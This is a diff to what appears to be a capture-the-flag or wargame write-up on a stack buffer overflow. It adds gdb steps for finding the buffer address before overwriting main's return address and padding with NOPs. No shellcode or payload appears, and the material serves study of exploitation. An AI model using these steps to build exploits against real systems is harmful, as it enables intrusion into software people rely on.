@@ -32,9 +32,13 @@ so our exploit will look like :
 Like this, the address of the buffer is written at the 54th byte and will
 overwrite the main ret address.
 
-We now find the buffer address :
+We now find the buffer address, lets break at the strncpy in p function :
 
-0xbffff680:	0xbffff6bf	0xbffff6be	0x61616161	0x61616161
+(gdb) b* 0x08048517
+
+(gdb) x/2w 0xbfffe670
+0xbfffe670:      U"\xbffff6b8\xbfffe680\024"
+0xbfffe680:      U"\x61616161\x61616161\x61616161\x61616161\x61616161\x61616161\x61616161慡"
 
 We found our a's :) We add 20 to this address + 100 NOPs and we will give 200
 NOPs to the exploit so we're sure we are in the range.
